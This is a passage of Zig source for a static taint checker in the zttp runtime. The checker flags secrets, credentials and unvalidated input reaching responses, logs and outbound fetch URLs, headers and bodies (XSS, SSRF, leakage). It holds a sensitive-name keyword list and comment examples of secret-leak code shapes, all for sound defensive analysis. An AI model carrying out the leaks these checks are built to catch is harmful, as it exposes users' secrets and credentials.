                        if (self.isGlobalMethodCall(call_data.callee, "Response", &.{"html"})) {
                            self.addDiagnostic(.{
                                .severity = .warning,
                                .kind = .unvalidated_input_in_egress,
                                .node = node,
                                .message = "unvalidated user input in Response.html (potential XSS)",
                                .help = "use JSX with renderToString() for auto-escaping, or pass input through validateObject() first",
                            });
                            self.properties.injection_safe = false;
                        }
                    } else if (labels.has(.validated)) {
                        // Defended: a validated value safely reaches an HTML
                        // response. The `.validated` label is present only
                        // because the value passed a named validator (e.g.
                        // escapeHtml/validateObject), so the guard is real.
                        if (self.isGlobalMethodCall(call_data.callee, "Response", &.{"html"})) {
                            self.recordValidated(.injection_safe, data_arg, node, "an HTML response body");
                        }
                    }
                }
                return true;
            },

            .ternary => {
                const t = self.ir_view.getTernary(node) orelse return false;
                const then_covered = self.checkResponseValue(t.then_branch, visited, visited_len);
                const else_covered = self.checkResponseValue(t.else_branch, visited, visited_len);
                return then_covered and else_covered;
            },

            .identifier => {
                const binding = self.ir_view.getBinding(node) orelse return false;
                const key = packBindingKey(binding.scope_id, binding.slot);
                for (visited[0..visited_len.*]) |seen| {
                    if (seen == key) return true;
                }
                if (visited_len.* >= visited.len) return false;
                visited[visited_len.*] = key;
                visited_len.* += 1;

                const values = self.binding_value_nodes.get(key) orelse return false;
                if (values.items.len == 0) return false;
                var all_covered = true;
                for (values.items) |value| {
                    if (!self.checkResponseValue(value, visited, visited_len)) all_covered = false;
                }
                return all_covered;
            },

            // exhaustive: false means "this shape was not resolved to a
            // Response helper", which sends the caller to the label-only sink
            // check on the original value. Failing to resolve costs precision
            // in the diagnostic, never the check itself.
            else => return false,
        }
    }

    fn checkExprSinks(self: *FlowChecker, node: NodeIndex) void {
        // While summarizing a callee body, expression sinks stay silent:
        // diagnostics belong to the handler walk.
        if (self.summary_returns != null) return;
        const tag = self.ir_view.getTag(node) orelse return;
        if (tag != .call and tag != .method_call) return;

        const call_data = self.ir_view.getCall(node) orelse return;

        if (self.isConsoleCall(call_data.callee)) {
            for (0..call_data.args_count) |i| {
                const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
                const labels = self.inferLabels(arg);
                self.checkSinkLabels(labels, node, .console);
            }
            return;
        }

        // zttp:log functions (logDebug/logInfo/logWarn/logError) serialize both
        // the message string and every value of the context object to stderr, so
        // they are log sinks just like console.*. Recognize them so a secret or
        // credential logged via logError(...) is caught.
        if (tag == .call and self.isLogModuleCall(call_data.callee)) {
            for (0..call_data.args_count) |i| {
                const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
                const labels = self.inferLabels(arg);
                self.checkSinkLabels(labels, node, .console);
            }
            return;
        }

        if (tag == .call) {
            // Egress sinks: the bare `fetchSync(url, opts)` global plus the
            // documented module APIs `fetch` (zttp:fetch) and `serviceCall`
            // (zttp:service). Recognizing only the bare global let a secret
            // flow into a `fetch(...)` body or URL go unflagged, falsely
            // discharging no_secret_leakage / injection_safe.
            if (self.isFetchSyncCall(call_data.callee)) {
                self.checkEgressCall(call_data, node, 0, 1);
            } else if (self.egressModuleFunc(call_data.callee)) |kind| {
                switch (kind) {
                    // fetch(url, init): url at 0, options at 1.
                    .fetch => self.checkEgressCall(call_data, node, 0, 1),
                    // serviceCall(service, route, init): route at 1, init at 2.
                    .service_call => self.checkEgressCall(call_data, node, 1, 2),
                }
            }
        }
    }

    const EgressKind = enum { fetch, service_call };

    /// True if the callee is an imported zttp:log function (logDebug, logInfo,
    /// logWarn, logError), which writes its arguments to stderr.
    fn isLogModuleCall(self: *const FlowChecker, callee: NodeIndex) bool {
        const callee_tag = self.ir_view.getTag(callee) orelse return false;
        if (callee_tag != .identifier) return false;
        const binding = self.ir_view.getBinding(callee) orelse return false;
        const meta = self.module_fn_meta.get(binding.slot) orelse return false;
        if (!std.mem.eql(u8, meta.module, "log")) return false;
        return std.mem.eql(u8, meta.func, "logDebug") or
            std.mem.eql(u8, meta.func, "logInfo") or
            std.mem.eql(u8, meta.func, "logWarn") or
            std.mem.eql(u8, meta.func, "logError");
    }

    /// Identify a call whose callee is an imported egress module function
    /// (`fetch` from zttp:fetch or `serviceCall` from zttp:service).
    fn egressModuleFunc(self: *const FlowChecker, callee: NodeIndex) ?EgressKind {
        const callee_tag = self.ir_view.getTag(callee) orelse return null;
        if (callee_tag != .identifier) return null;
        const binding = self.ir_view.getBinding(callee) orelse return null;
        const meta = self.module_fn_meta.get(binding.slot) orelse return null;
        if (std.mem.eql(u8, meta.func, "fetch")) return .fetch;
        if (std.mem.eql(u8, meta.func, "serviceCall")) return .service_call;
        return null;
    }

    /// Apply the egress-URL and egress-body sink checks for a call with the URL
    /// (or route) at `url_idx` and the request-options object at `body_idx`.
    fn checkEgressCall(self: *FlowChecker, call_data: Node.CallExpr, node: NodeIndex, url_idx: u8, body_idx: u8) void {
        if (call_data.args_count > url_idx) {
            const url_arg = self.ir_view.getListIndex(call_data.args_start, url_idx);
            self.checkSinkLabels(self.inferLabels(url_arg), node, .egress_url);
        }
        if (call_data.args_count > body_idx) {
            const opts_arg = self.ir_view.getListIndex(call_data.args_start, body_idx);

            // Hoisted into a binding, the options object is not a literal, so
            // none of the per-field extractors below can see which init field
            // a value lands in - they answer empty, which reads as "no such
            // field". Only the body fallback ran, and the body arm checks
            // neither `credential` nor the URL-side properties, so a caller's
            // token in `const opts = { headers: { authorization: token } }`
            // reached the wire with no_credential_leakage still proven. Route
            // the whole object to the one sink that assumes any field.
            if (self.ir_view.getTag(opts_arg) != .object_literal) {
                self.checkSinkLabels(self.inferLabels(opts_arg), node, .egress_opaque);
                return;
            }

            const body_labels = self.inferObjectBodyLabels(opts_arg);
            self.checkSinkLabels(body_labels, node, .egress_body);
            // Defended: a validated value safely reaches an egress body.
            // `.validated` is present only because the value passed a named
            // validator; `findGuardInExpr` recurses the options object to the
            // `body:` value to name it.
            if (body_labels.has(.validated)) {
                for ([_]counterexample.PropertyTag{ .injection_safe, .input_validated }) |defended_tag| {
                    self.recordValidated(defended_tag, opts_arg, node, "an egress request body");
                }
            }

            // The `query` init field is appended to the egress URL at runtime
            // (buildFetchUrl / appendServiceQuery), so a secret or credential in
            // it is a URL sink, not a body sink. inferObjectBodyLabels returns
            // only the `body` value when a body key is present, so without this
            // the query would escape every sink check and falsely discharge
            // no_secret_leakage.
            self.checkSinkLabels(self.inferObjectPropLabels(opts_arg, "query"), node, .egress_url);

            // The `headers` init field is transmitted verbatim to the external
            // host (zruntime serializes it onto the wire). A secret or credential
            // placed in a header escapes the body and URL sink checks above, so
            // without this it would falsely discharge no_secret_leakage /
            // no_credential_leakage - and the URL sink's own help text steers
            // users to put tokens in headers.
            self.checkSinkLabels(self.inferObjectPropLabels(opts_arg, "headers"), node, .egress_headers);

            // A spread inside the options object (`{ body: ..., ...x }`) can
            // populate body, query, or headers with fields the per-field
            // extractors above cannot see (and the `body:` early return in
            // inferObjectBodyLabels short-circuits the whole-object fallback).
            // Conservatively route any spread-carried labels to every egress
            // sink so a secret cannot escape via
            // `fetch(url, { body: "ok", ...{ query: { k: secret } } })`.
            const spread_labels = self.inferObjectSpreadLabels(opts_arg);
            self.checkSinkLabels(spread_labels, node, .egress_url);
            self.checkSinkLabels(spread_labels, node, .egress_body);
            self.checkSinkLabels(spread_labels, node, .egress_headers);
        }
    }

    /// `egress_opaque` is an egress call whose options object the checker
    /// cannot read field by field - it was built elsewhere and passed by name.
    /// It carries the union of the URL, body, and header checks, since the
    /// value may land in any of them.
    const SinkKind = enum { response, console, egress_url, egress_body, egress_headers, egress_opaque };

    fn checkSinkLabels(self: *FlowChecker, labels: LabelSet, node: NodeIndex, sink: SinkKind) void {
        if (labels.isEmpty()) return;

        // A value the walk could not trace proves nothing about itself, so
        // every property this sink decides is cleared rather than held. No
        // diagnostic: nothing is known to be wrong, and the proof card showing
        // the property unproven is the honest report. The same treatment
        // `nondeterministic` gets at the response sink, for the same reason.
        if (labels.has(.unknown)) self.clearSinkProperties(sink);

        switch (sink) {
            .response => {
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_response,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into response body", .secret),
                        .help = "env vars with sensitive names (SECRET, PASSWORD, KEY, TOKEN) must not appear in responses",
                    });
                    self.properties.no_secret_leakage = false;
                }
                if (labels.has(.nondeterministic)) {
                    // No diagnostic: returning a clock- or RNG-derived value is
                    // legitimate, unlike leaking a secret. It costs the
                    // property, and the proof card is where that shows up.
                    self.properties.deterministic = false;
                }
                if (labels.has(.credential)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .credential_in_response,
                        .node = node,
                        .message = self.messageWithReason("credential data flows into response body", .credential),
                        .help = "auth tokens and JWT payloads should not be returned to clients",
                    });
                    self.properties.no_credential_leakage = false;
                }
            },
            .console => {
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_log,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into console output", .secret),
                        .help = "env vars with sensitive names must not be logged",
                    });
                    self.properties.no_secret_leakage = false;
                }
                if (labels.has(.credential)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .credential_in_log,
                        .node = node,
                        .message = self.messageWithReason("credential data flows into console output", .credential),
                        .help = "auth tokens and JWTs must not be logged",
                    });
                    self.properties.no_credential_leakage = false;
                }
            },
            .egress_url => {
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_egress_url,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into fetchSync URL", .secret),
                        .help = "secrets in URLs are logged by proxies and CDNs; pass secrets in headers or body instead",
                    });
                    self.properties.no_secret_leakage = false;
                }
                if (labels.has(.credential)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .credential_in_egress_url,
                        .node = node,
                        .message = self.messageWithReason("credential data flows into fetchSync URL", .credential),
                        .help = "pass auth tokens in headers, not URLs",
                    });
                    self.properties.no_credential_leakage = false;
                }
                // Unvalidated user input in the egress URL is an SSRF /
                // request-forgery sink, mirroring the egress-body check.
                if (labels.has(.user_input) and !labels.has(.validated)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .unvalidated_input_in_egress,
                        .node = node,
                        .message = "unvalidated user input flows into fetchSync URL",
                        .help = "validate user input before using it in an egress URL to avoid SSRF / request forgery",
                    });
                    self.properties.input_validated = false;
                    self.properties.injection_safe = false;
                }
                // PII containment: user input flowing to external hosts.
                if (labels.has(.user_input)) {
                    self.properties.pii_contained = false;
                }
            },
            .egress_body => {
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_egress_body,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into fetchSync request body", .secret),
                        .help = "do not send env secrets to external services",
                    });
                    self.properties.no_secret_leakage = false;
                }
                // Check for unvalidated user input in egress
                if (labels.has(.user_input) and !labels.has(.validated)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .unvalidated_input_in_egress,
                        .node = node,
                        .message = "unvalidated user input flows into fetchSync body",
                        .help = "pass user input through validateJson() or validateObject() before sending to external services",
                    });
                    self.properties.input_validated = false;
                    self.properties.injection_safe = false;
                }
                // PII containment: user input going to external hosts
                if (labels.has(.user_input)) {
                    self.properties.pii_contained = false;
                }
            },
            .egress_headers => {
                // Headers reach the external host like the URL and body, so a
                // secret or credential here is a leak. Reuse the egress-URL
                // diagnostic kinds (no new policy-hash surface) with messages
                // specific to the headers init field.
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_egress_url,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into fetchSync request headers", .secret),
                        .help = "do not send env secrets to external services, even in headers",
                    });
                    self.properties.no_secret_leakage = false;
                }
                if (labels.has(.credential)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .credential_in_egress_url,
                        .node = node,
                        .message = self.messageWithReason("credential data flows into fetchSync request headers", .credential),
                        .help = "forwarding a caller's auth token to a third party can leak it; scope credentials per service",
                    });
                    self.properties.no_credential_leakage = false;
                }
                if (labels.has(.user_input) and !labels.has(.validated)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .unvalidated_input_in_egress,
                        .node = node,
                        .message = "unvalidated user input flows into fetchSync request headers",
                        .help = "validate user input before placing it in an egress header to avoid header injection / request forgery",
                    });
                    self.properties.input_validated = false;
                    self.properties.injection_safe = false;
                }
                if (labels.has(.user_input)) {
                    self.properties.pii_contained = false;
                }
            },
            .egress_opaque => {
                // Same properties as the URL and header arms, which check the
                // same set; the messages differ only in naming the options
                // object rather than a field, because which field this lands
                // in is exactly what could not be determined. The diagnostic
                // kinds are the existing egress ones, so no new rule reaches
                // the policy hash.
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_egress_body,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into a fetch options object", .secret),
                        .help = "build the options object at the call site so each field can be checked, and do not send env secrets to external services",
                    });
                    self.properties.no_secret_leakage = false;
                }
                if (labels.has(.credential)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .credential_in_egress_url,
                        .node = node,
                        .message = self.messageWithReason("credential data flows into a fetch options object", .credential),
                        .help = "forwarding a caller's auth token to a third party can leak it; scope credentials per service",
                    });
                    self.properties.no_credential_leakage = false;
                }
                if (labels.has(.user_input) and !labels.has(.validated)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .unvalidated_input_in_egress,
                        .node = node,
                        .message = "unvalidated user input flows into a fetch options object",
                        .help = "validate user input before sending it to an external service",
                    });
                    self.properties.input_validated = false;
                    self.properties.injection_safe = false;
                }
                if (labels.has(.user_input)) {
                    self.properties.pii_contained = false;
                }
            },
        }
    }

    /// Clear every property the given sink can decide. Called when a value
    /// carrying `.unknown` reaches it: the sink cannot tell what the value is,
    /// so it cannot hold any property that depends on knowing.
    fn clearSinkProperties(self: *FlowChecker, sink: SinkKind) void {
        switch (sink) {
            .response => {
                self.properties.no_secret_leakage = false;
                self.properties.no_credential_leakage = false;
                self.properties.deterministic = false;
            },
            .console => {
                self.properties.no_secret_leakage = false;
                self.properties.no_credential_leakage = false;
            },
            .egress_url, .egress_headers, .egress_opaque => {
                self.properties.no_secret_leakage = false;
                self.properties.no_credential_leakage = false;
                self.properties.input_validated = false;
                self.properties.injection_safe = false;
                self.properties.pii_contained = false;
            },
            .egress_body => {
                self.properties.no_secret_leakage = false;
                self.properties.input_validated = false;
                self.properties.injection_safe = false;
                self.properties.pii_contained = false;
            },
        }
    }

    /// Refine env() labels based on the literal env var name.
    /// Names containing SECRET, PASSWORD, KEY, TOKEN, or PRIVATE keep {secret}.
    /// Others get downgraded to {config}.
    fn refineEnvLabels(self: *const FlowChecker, arg_node: NodeIndex, base_labels: LabelSet) LabelSet {
        const arg_tag = self.ir_view.getTag(arg_node) orelse return base_labels;
        if (arg_tag != .lit_string) return base_labels; // non-literal: keep conservative

        const name = self.ir_view.getString(self.ir_view.getStringIdx(arg_node) orelse return base_labels) orelse return base_labels;

        if (isSensitiveEnvName(name)) {
            return base_labels; // keep {secret}
        }

        // Non-sensitive name: downgrade to {config}
        return .{ .config = true };
    }

    fn isSensitiveEnvName(name: []const u8) bool {
        const patterns = [_][]const u8{
            "SECRET",  "PASSWORD",   "PASSWD", "KEY", "TOKEN",
            "PRIVATE", "CREDENTIAL", "AUTH",
        };
        for (patterns) |pattern| {
            if (indexOfIgnoreCase(name, pattern)) return true;
        }
        return false;
    }

    fn indexOfIgnoreCase(haystack: []const u8, needle: []const u8) bool {
        if (needle.len > haystack.len) return false;
        const end = haystack.len - needle.len + 1;
        for (0..end) |i| {
            var match = true;
            for (needle, 0..) |nc, j| {
                if (std.ascii.toUpper(haystack[i + j]) != nc) {
                    match = false;
                    break;
                }
            }
            if (match) return true;
        }
        return false;
    }

    /// Check if callee is `Global.method()` where Global and method match the given names.
    fn isGlobalMethodCall(self: *const FlowChecker, callee: NodeIndex, object_name: []const u8, method_names: []const []const u8) bool {
        const tag = self.ir_view.getTag(callee) orelse return false;
        if (tag != .member_access and tag != .optional_chain) return false;
        const member = self.ir_view.getMember(callee) orelse return false;

        const obj_tag = self.ir_view.getTag(member.object) orelse return false;
        if (obj_tag != .identifier) return false;
        const binding = self.ir_view.getBinding(member.object) orelse return false;
        if (binding.kind != .undeclared_global) return false;
        const obj_name = self.resolveAtomName(binding.name_atom) orelse return false;
        if (!std.mem.eql(u8, obj_name, object_name)) return false;

        const method_name = self.resolveAtomName(member.property) orelse return false;
        for (method_names) |name| {
            if (std.mem.eql(u8, method_name, name)) return true;
        }
        return false;
    }

    fn isResponseHelper(self: *const FlowChecker, callee: NodeIndex) bool {
        return self.isGlobalMethodCall(callee, "Response", &.{ "json", "text", "html", "redirect" });
    }

    fn isConsoleCall(self: *const FlowChecker, callee: NodeIndex) bool {
        return self.isGlobalMethodCall(callee, "console", &.{ "log", "warn", "error" });
    }

    fn isFetchSyncCall(self: *const FlowChecker, callee: NodeIndex) bool {
        const tag = self.ir_view.getTag(callee) orelse return false;
        if (tag != .identifier) return false;
        const binding = self.ir_view.getBinding(callee) orelse return false;
        if (binding.kind != .undeclared_global) return false;
        const name = self.resolveAtomName(binding.name_atom) orelse return false;
        return std.mem.eql(u8, name, "fetchSync");
    }

    /// True if the callee is the bare global `renderToString`, the JSX-to-HTML
    /// serializer that auto-escapes interpolated values.
    fn isRenderToStringCall(self: *const FlowChecker, callee: NodeIndex) bool {
        const tag = self.ir_view.getTag(callee) orelse return false;
        if (tag != .identifier) return false;
        const binding = self.ir_view.getBinding(callee) orelse return false;
        if (binding.kind != .undeclared_global) return false;
        const name = self.resolveAtomName(binding.name_atom) orelse return false;
        return std.mem.eql(u8, name, "renderToString");
    }

    /// True for a global read whose result differs between runs. The receiver
    /// must be an undeclared global, so a user-defined `Date` shadowing the
    /// builtin does not pick up the label.
    ///
    /// The set lives in `known_globals.varying_reads` because
    /// `effect_inference.isNonDeterministic` needs the same one to answer the
    /// per-function question these labels cannot reach. Both used to carry a
    /// hand-copied pair, and both were missing `performance.now`.
    fn isVaryingGlobalRead(self: *const FlowChecker, callee: NodeIndex) bool {
        const member = self.ir_view.getMember(callee) orelse return false;
        if (self.ir_view.getTag(member.object) != .identifier) return false;
        const binding = self.ir_view.getBinding(member.object) orelse return false;
        if (binding.kind != .undeclared_global) return false;
        const object_name = self.resolveAtomName(binding.name_atom) orelse return false;
        const property_name = self.resolveAtomName(member.property) orelse return false;
        return known_globals.isVaryingRead(object_name, property_name);
    }

    fn isReqProperty(self: *const FlowChecker, node: NodeIndex, expected_prop: []const u8) bool {
        const tag = self.ir_view.getTag(node) orelse return false;
        if (tag != .member_access and tag != .optional_chain) return false;
        const member = self.ir_view.getMember(node) orelse return false;

        // Check if object is the request binding
        const obj_tag = self.ir_view.getTag(member.object) orelse return false;
        if (obj_tag != .identifier) return false;
        const binding = self.ir_view.getBinding(member.object) orelse return false;
        const key = packBindingKey(binding.scope_id, binding.slot);
        if (self.req_binding_key == null or key != self.req_binding_key.?) return false;

        const prop_name = self.resolveAtomName(member.property) orelse return false;
        return std.mem.eql(u8, prop_name, expected_prop);
    }

    // -------------------------------------------------------------------
    // Helper: extract body labels from options object { body: ... }
    // -------------------------------------------------------------------

    fn inferObjectBodyLabels(self: *FlowChecker, node: NodeIndex) LabelSet {
        const tag = self.ir_view.getTag(node) orelse return LabelSet.empty;
        if (tag == .object_literal) {
            const obj = self.ir_view.getObject(node) orelse return LabelSet.empty;
            var i: u16 = 0;
            while (i < obj.properties_count) : (i += 1) {
                const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
                const prop_tag = self.ir_view.getTag(prop_idx) orelse continue;
                if (prop_tag == .object_property) {
                    const prop = self.ir_view.getProperty(prop_idx) orelse continue;
                    const key_name = self.getPropertyKeyName(prop.key) orelse continue;
                    if (std.mem.eql(u8, key_name, "body")) {
                        return self.inferLabels(prop.value);
                    }
                }
            }
        }
        // If not an object literal, infer labels of the whole thing
        return self.inferLabels(node);
    }

    /// Labels of a named property's value in an object literal, or empty when the
    /// node is not an object literal or has no such property.
    fn inferObjectPropLabels(self: *FlowChecker, node: NodeIndex, key: []const u8) LabelSet {
        const tag = self.ir_view.getTag(node) orelse return LabelSet.empty;
        if (tag != .object_literal) return LabelSet.empty;
        const obj = self.ir_view.getObject(node) orelse return LabelSet.empty;
        var i: u16 = 0;
        while (i < obj.properties_count) : (i += 1) {
            const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
            if ((self.ir_view.getTag(prop_idx) orelse continue) != .object_property) continue;
            const prop = self.ir_view.getProperty(prop_idx) orelse continue;
            const key_name = self.getPropertyKeyName(prop.key) orelse continue;
            if (std.mem.eql(u8, key_name, key)) return self.inferLabels(prop.value);
        }
        return LabelSet.empty;
    }

    /// Union of labels carried by every `.object_spread` element of an options
    /// object literal (`{ ...x }`). A spread can populate `body`, `query`, or
    /// `headers` with fields the per-field extractors cannot see, so its labels
    /// must be checked against every egress sink. Mirrors the spread branch of
    /// `inferLabels`'s object_literal case. Returns empty when the node is not
    /// an object literal or carries no spread.
    fn inferObjectSpreadLabels(self: *FlowChecker, node: NodeIndex) LabelSet {
        const tag = self.ir_view.getTag(node) orelse return LabelSet.empty;
        if (tag != .object_literal) return LabelSet.empty;
        const obj = self.ir_view.getObject(node) orelse return LabelSet.empty;
        var labels = LabelSet.empty;
        var i: u16 = 0;
        while (i < obj.properties_count) : (i += 1) {
            const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
            if ((self.ir_view.getTag(prop_idx) orelse continue) != .object_spread) continue;
            if (self.ir_view.getOptValue(prop_idx)) |val| {
                labels = LabelSet.merge(labels, self.inferLabels(val));
            }
        }
        return labels;
    }

    /// Get the name of an object property key (identifier or string literal).
    fn getPropertyKeyName(self: *const FlowChecker, key_idx: NodeIndex) ?[]const u8 {
        const tag = self.ir_view.getTag(key_idx) orelse return null;
        if (tag == .identifier) {
            const binding = self.ir_view.getBinding(key_idx) orelse return null;
            return self.resolveAtomName(binding.name_atom);
        } else if (tag == .lit_string) {
            const str_idx = self.ir_view.getStringIdx(key_idx) orelse return null;
            return self.ir_view.getString(str_idx);
        }
        return null;
    }

    /// Track result bindings from validation function calls.
    /// When `const result = validateJson(...)` is seen, records the function's
    /// return_labels so that `result.value` inherits them during label inference.
    fn trackResultBinding(self: *FlowChecker, vd: ir.Node.VarDecl) void {
        const init_tag = self.ir_view.getTag(vd.init) orelse return;
        if (init_tag != .call) return;

        const call_data = self.ir_view.getCall(vd.init) orelse return;
        const callee_tag = self.ir_view.getTag(call_data.callee) orelse return;
        if (callee_tag != .identifier) return;

        const callee_binding = self.ir_view.getBinding(call_data.callee) orelse return;
        const return_labels = self.module_fn_labels.get(callee_binding.slot) orelse return;

        // Only track if the function returns labels worth propagating (e.g., validated)
        if (return_labels.has(.validated)) {
            const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
            // Refined the same way a direct call is, not stored as declared.
            // `const r = validateJson("s", secret); return r.value;` is the
            // shape the fail-open actually shipped in - fixing only
            // `inferCallLabels` would leave this path laundering.
            const refined = self.parsedResultLabels(return_labels, call_data);
            self.result_binding_labels.put(self.allocator, key, refined) catch self.markAllocationFailure();
            // Remember the validator that cleared the taint so a defended path
            // can name it. `func` is borrowed from the module metadata table.
            if (self.module_fn_meta.get(callee_binding.slot)) |meta| {
                self.result_binding_guard.put(self.allocator, key, .{
                    .func = meta.func,
                    .node = vd.init,
                }) catch self.markAllocationFailure();
            }
        }
    }

    /// Find the first external reason matching the given label.
    /// Iterates all external_reasons entries whose corresponding LabelSet
    /// includes the target label. Returns null if no external label contributed.
    fn findExternalReason(self: *const FlowChecker, label: DataLabel) ?[]const u8 {
        var iter = self.external_reasons.iterator();
        while (iter.next()) |entry| {
            if (self.external_labels.get(entry.key_ptr.*)) |ext_ls| {
                if (ext_ls.has(label)) return entry.value_ptr.*;
            }
        }
        return null;
    }

    /// Return a diagnostic message, appending the external reason if one exists.
    /// When no external reason applies, the original literal is returned as-is
    /// (no allocation). When a reason exists, a new string is allocated and
    /// tracked in allocated_messages for cleanup.
    fn messageWithReason(self: *FlowChecker, base: []const u8, label: DataLabel) []const u8 {
        const reason = self.findExternalReason(label) orelse return base;
        const formatted = std.fmt.allocPrint(self.allocator, "{s} ({s})", .{ base, reason }) catch return base;
        self.allocated_messages.append(self.allocator, formatted) catch {
            self.allocator.free(formatted);
            return base;
        };
        return formatted;
    }

    fn addDiagnostic(self: *FlowChecker, diag: Diagnostic) void {
        var owned = diag;
        // Only diagnostics the counterexample surface can actually consume
        // carry a witness snapshot. Skipping the dupe for everything else
        // avoids allocator churn when the handler raises many non-witness
        // diagnostics (unused-variable warnings, XSS warnings, etc.).
        if (propertyTagForKind(diag.kind) != null and
            (self.working_constraints.items.len > 0 or self.working_io_calls.items.len > 0))
        {
            const constraints = self.allocator.dupe(
                counterexample.WitnessConstraint,
                self.working_constraints.items,
            ) catch blk: {
                self.markAllocationFailure();
                break :blk &[_]counterexample.WitnessConstraint{};
            };
            const io_calls = self.allocator.dupe(
                counterexample.TrackedIoCall,
                self.working_io_calls.items,
            ) catch blk: {
                self.markAllocationFailure();
                break :blk &[_]counterexample.TrackedIoCall{};
            };
            owned.witness = .{
                .path_constraints = constraints,
                .io_calls = io_calls,
            };
        }
        self.diagnostics.append(self.allocator, owned) catch {
            if (owned.witness) |w| {
                if (w.path_constraints.len > 0) self.allocator.free(w.path_constraints);
                if (w.io_calls.len > 0) self.allocator.free(w.io_calls);
            }
            self.markAllocationFailure();
        };
    }

    /// Push zero or more constraints derived from `cond` onto the working
    /// stack. AND chains contribute one constraint per clause; every other
    /// shape contributes at most one. Returns the number pushed so the
    /// caller can pop exactly that many when the branch body is done.
    ///
    /// Under `want_negation` (the else-branch path), an AND chain contributes
    /// one negated clause. `!(a && b)` is `!a || !b`; emitting every negated
    /// clause would force `!a && !b`, which can make a witness skip the value
    /// it is supposed to leak.
    fn pushConditionConstraints(self: *FlowChecker, cond: NodeIndex, want_negation: bool) usize {
        const tag = self.ir_view.getTag(cond) orelse return 0;
        if (tag == .binary_op) {
            const bin = self.ir_view.getBinary(cond) orelse return 0;
            if (bin.op == .and_op) {
                if (want_negation) {
                    const final = self.findNegatedAndConstraint(cond, true) orelse
                        self.findNegatedAndConstraint(cond, false) orelse
                        return 0;
                    self.working_constraints.append(self.allocator, final) catch {
                        self.markAllocationFailure();
                        return 0;
                    };
                    return 1;
                }
                const left = self.pushConditionConstraints(bin.left, want_negation);
                const right = self.pushConditionConstraints(bin.right, want_negation);
                return left + right;
            }
        }

        const raw = self.extractCondConstraint(cond) orelse return 0;
        const final = if (want_negation) counterexample.negate(raw) orelse return 0 else raw;
        self.working_constraints.append(self.allocator, final) catch {
            self.markAllocationFailure();
            return 0;
        };
        return 1;
    }

    fn popConstraints(self: *FlowChecker, count: usize) void {
        var remaining = count;
        while (remaining > 0) : (remaining -= 1) _ = self.working_constraints.pop();
    }

    /// Record a virtual-module call on the current path, if `vd.init` is a
    /// direct call to an imported module function. Also remembers the
    /// originating module-function slot on the declared binding so that
    /// later `if (x)` patterns can emit stub_truthy.
    fn trackModuleCallInit(self: *FlowChecker, vd: Node.VarDecl) void {
        const init_tag = self.ir_view.getTag(vd.init) orelse return;
        if (init_tag != .call) return;
        const call = self.ir_view.getCall(vd.init) orelse return;
        const callee_tag = self.ir_view.getTag(call.callee) orelse return;
        if (callee_tag != .identifier) return;
        const binding = self.ir_view.getBinding(call.callee) orelse return;
        const meta = self.module_fn_meta.get(binding.slot) orelse return;
        const call_index = self.working_io_calls.items.len;
        self.working_io_calls.append(self.allocator, .{
            .module = meta.module,
            .func = meta.func,
            .returns = meta.returns,
        }) catch {
            self.markAllocationFailure();
            return;
        };
        var call_meta = meta;
        call_meta.call_index = @intCast(call_index);
        const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
        self.binding_origin.put(self.allocator, key, call_meta) catch self.markAllocationFailure();
    }

    fn findNegatedAndConstraint(
        self: *FlowChecker,
        cond: NodeIndex,
        prefer_request: bool,
    ) ?counterexample.WitnessConstraint {
        const tag = self.ir_view.getTag(cond) orelse return null;
        if (tag == .binary_op) {
            const bin = self.ir_view.getBinary(cond) orelse return null;
            if (bin.op == .and_op) {
                return self.findNegatedAndConstraint(bin.left, prefer_request) orelse
                    self.findNegatedAndConstraint(bin.right, prefer_request);
            }
        }

        const raw = self.extractCondConstraint(cond) orelse return null;
        const negated = counterexample.negate(raw) orelse return null;
        if (prefer_request and !isRequestConstraint(negated)) return null;
        return negated;
    }

    fn isRequestConstraint(c: counterexample.WitnessConstraint) bool {
        return switch (c) {
            .req_method, .req_method_not, .req_url, .req_url_not => true,
            else => false,
        };
    }

    /// Extract a single WitnessConstraint from a condition node. AND
    /// chains are handled one level up in `pushConditionConstraints`;
    /// supported single-node shapes are documented by the switch arms.
    fn extractCondConstraint(self: *FlowChecker, cond: NodeIndex) ?counterexample.WitnessConstraint {
        const tag = self.ir_view.getTag(cond) orelse return null;
        switch (tag) {
            .identifier => {
                const binding = self.ir_view.getBinding(cond) orelse return null;
                const key = packBindingKey(binding.scope_id, binding.slot);
                const meta = self.binding_origin.get(key) orelse return null;
                if (meta.returns != .boolean) return null;
                return .{ .stub_truthy = .{
                    .module = meta.module,
                    .func = meta.func,
                    .returns = meta.returns,
                    .call_index = meta.call_index,
                } };
            },
            .unary_op => {
                const unary = self.ir_view.getUnary(cond) orelse return null;
                if (unary.op != .not) return null;
                const inner = self.extractCondConstraint(unary.operand) orelse return null;
